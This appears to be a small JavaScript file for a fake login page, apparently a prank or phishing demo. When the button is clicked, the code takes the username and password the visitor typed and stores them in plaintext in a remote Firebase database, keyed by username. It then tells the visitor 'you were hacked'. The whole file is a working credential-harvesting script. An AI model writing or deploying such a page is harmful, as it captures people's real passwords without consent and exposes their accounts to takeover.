import { set , ref , onValue } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-database.js";
import { db } from "./firebase.js";

const btn = document.querySelector("button")
const inpName = document.querySelector("#username")
const inpPass = document.querySelector("#password")
const danger = document.querySelector("#dangerAlerts");
const main = document.querySelector("main")

function dataWrite (){
    var x = ref(db , "users/" + `${inpName.value}`)
        set(x, {
            username:inpName.value,
            password:inpPass.value
        })
}

btn.addEventListener("click",function (e){
    e.preventDefault();
    if(inpName.value.length >= 8 && inpPass.value.length >= 8){
        danger.style.display = "block"
        danger.innerHTML = `you were hacked`
        main.style.background = "red";
        dataWrite()
    } else {
        danger.style.display = "block"
        danger.innerHTML = `fill in entries`
    }
})